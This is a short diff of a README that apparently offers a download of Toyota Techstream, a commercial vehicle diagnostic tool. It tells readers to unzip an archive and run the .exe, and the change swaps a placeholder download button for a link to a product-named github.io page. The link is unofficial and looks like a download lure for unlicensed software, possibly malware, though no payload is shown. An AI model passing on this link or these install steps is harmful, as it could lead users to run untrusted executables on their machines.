@@ -11,7 +11,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to install Toyota Techstream and connect your compatible OBD interface.
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://toyota-techstream.github.io/.github/)
 
 ## 📸 Overview
 ![techstream-livedata](https://github.com/user-attachments/assets/6e905865-e87c-4f7c-8daf-175c63830bb5)
